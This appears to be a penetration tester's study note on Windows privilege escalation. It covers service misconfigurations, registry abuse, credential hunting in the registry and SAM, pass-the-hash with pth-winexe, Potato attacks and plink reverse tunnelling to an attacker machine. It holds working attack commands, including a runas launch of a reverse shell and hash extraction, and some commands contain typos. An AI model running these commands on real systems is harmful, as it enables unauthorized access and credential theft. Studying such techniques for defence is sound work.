# Privilege Escalation Tecniques

## Kernel Exploits
Kernel has the complete control over the OS. After enumerating kernel version with:
```console
systeminfo
```

we can then find exploits with Windows Exploit Suggester (bitsadmin), Precompiled Kernel Exploits (SecWiki) or Watson (rasta-mouse).

## Service Exploits
Services are programs that run in background. There are 5 types of misconfigurations based on Services. Configurations can be seen with the `accesschk` executable. Here useful commands for services:

```console
# Query the configuration of a service
sc qc {SERVICE_NAME}

# Query the current status of a service
sc query {SERVICE_NAME}

# Modify a configuration of a service
sc config {SERVICE_NAME} {OPTION}= {VALUE}

# Start and Stop a service
net start/stop {SERVICE_NAME}
```

### Insecure Service Properties
If a service has permissions such as:
* SERVICE_CHANGE_CONFIG
* SERVICE_ALL_ACCESS
it could be a privilege escalation path.

The easiest way to escalate in this case is to change the binary PATH with a reverse shell'PATH, then start the service. 

N.B. We must be able to start/restart the service to complete the escalation, otherwise is a Rabbit Hole

### Unquoted Service Path
This misconfiguration happens when a service has an unquoted path. Suppose a path like `C:\Programs Files\Some Dir\Program.exe`. Without quotes, Windows recognizes multiple alternatives, and the ambiguity is resolved by checking each possibilities in turn:

| Program | Arg1 | Arg2 |
| :-----: | :--: | :--: |
| C:\Programs | Files\Some | Dir\Program.exe |
| C:\Programs Files\Some | Dir\Program.exe | - |
| C:\Programs Files\Some Dir\Program.exe | - | - |

If we are able to write in one of the previous locations (C:\ or Programs Files) we can led the service to execute our executable (respectively called Programs and Some) containing, for example, a reverse shell.

### Weak Registry Permissions
If ACL is misconfigured for a specific registry, modifying its content brings to modify service configuration (even if it cannot be modified directly). Like `Unsecure Service Properties` we can modift the `ImagePath` registry key to point our server shell executable, then start the service.


### Insecure Service Executables
If the service executable is modifiable, we can simply replace its content with our reverse shell. (We can stop the service, modify the content and start it again)

### DLL Hijacking
Often a service tries to load a functionality from a DLL. This DLL will be executed with the same privileges the service has loaded it. We can change the content of the DLL or, if a DLL loaded is missing, create the DLL.
Unfortunately, this last procedure requires manual dinaymic analysis.

## Registry

### AutoRuns
Registry contains `AutoRuns`, commands/executables that can be run at startup with elevated privileges. If we are able to change the content of an AutoRun executable and we are able to restart the OS, we can be able to escalate privileges. 

### AlwaysInstallElevated
MSI files, used to install apps, run with the permissions of the user trying to install.
`AlwaysInstallElevated` is a particular registry that allows to install apps always with elevated privileges. 
If this registry is set to 1, we can create a reverse shell with `msfvenom` and msi output format, copy it into the target system and execute it.

##  Passwords

### Stored Passwords
Both programs and Windows itself store password and configurations in Windows Registry. Searching Registry for passwords is always a good choice.

```console
# Local Machine
reg query HKLM /f password /t REF_SZ /s
# Current User
reg query HKCU /f password /t REF_SZ /s
```

### Saved Credentials
Windows has a runas command which allows users to run commands with privilege of other users requiring a password (sort of sudo).
Windows allows users to save credentials to the system, so password is not required with runas

```console
cmdkey /list

runas /savecred /user:admin reverse.exe
```

### Configuration Files 
Administrators can leave configuration files in the system, containing password in them. An example is the `Unattend.xml` file, used to automate the OS installation process.

### SAM
Windows stores password hashes in SAM, Security Account Manager, located in `C:\Windows\System32\config`.
The key used to encrypt the hashes is stored in SYSTEM file, located in `C:\Windows\System32\config/RegBack`. If we are able to read both files, we can extract the hashes using `creddump7`.

```console
python pwdump.py SYSTEM SAM
```
Hashes returned by the tool are two: `LM` and `NTLM` hashes. The first one is deprecated and it contains always the hash of an empty string. We can crack the NTLM hash with `hashcat`

### Passing the HASH
Evenif if we cannot crack the hash, we can use it in a modified version of winexe, called `pth-winexe`, that allows us to spawn a shell

```console
pth winexe --system -U 'admin%{HASH} {TARGET} cmd.exe
```

## Scheduled Tasks
Windows can run tasks periodically or when triggered by events (login). Tasks usually run with the user who creates it. 
Unfortunately a user can check only scheduled tasks owned by him, not the ones belonging to other users.

If we can find an executable that seems to be a scheduled task owned by others, that is writable by us, we can modify it with a reverse shell and wait for the schedule.

## Insecure GUI Apps
A user could be granted the permission to run certain GUI apps with admin privileges. Spawning a command prompts from that GUI, the command will ran with the same privilege of the GUI.
E.g. is click on Open File from the GUI, and open `file://C:/Windows/System32/cmd.exe`

## Startup Apps
Every user can define apps that start when they login. These apps are situated in `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`
If we can create files in this directory, we can put here our reverse shell that will spawn where the admin logs in.

## Installed Apps
Installed apps can have misconfiguration. These may be found online (e.g. ExploitDB).

We can numerate all running program in Windows searching from a vulnerability with :

```console
tasklist /v

# or
seatbelt.exe NonstandardProcess
```

## Hot Potato, Rotten Potato and Juicy Potato
Hot Potato is the name of an attack that tricks Windows into authenticating to a fake HTTP server usign NTLM. Credentials are relayed to SMB.
It works on Windows 7, 8 and the earlier versions of Windows 10.

```console
.\potato.exe -ip {IP} -cmd "{REVERSE_SHELL_PATH}" - enable_httpserver true -enable_defender true -enable_spoof true - enable_exhaust true
```

Rotten and Juicy are instead, based on token management. Both are possible because service accounts have `SeImpersonatePrivilege` privilege enabled

## Port Forwarding
Sometimes programs are listening only in internal ports. In these cases we need to forward ports. A good program is `plink.exe` that establishes an ssh connection with our Kali machine.

```console
# From target
.\plink.exe root@{KALI_IP} -R {KALI_PORT}:127.0.0.1:{TARGET_PORT}
```